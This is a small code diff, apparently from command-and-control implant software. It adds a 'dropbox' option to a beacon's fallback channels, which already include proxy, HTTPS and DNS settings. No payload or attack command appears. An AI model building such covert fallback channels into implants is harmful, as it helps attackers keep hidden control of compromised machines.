@@ -139,6 +139,7 @@ def main():
                         "proxy": c2_cfg.get("proxy", {}),
                         "https": fallback_cfg.get("https", {}),
                         "dns": fallback_cfg.get("dns", {}),
+                        "dropbox": True,
                     }
                 }
                 beacon = Beacon(fb_config)
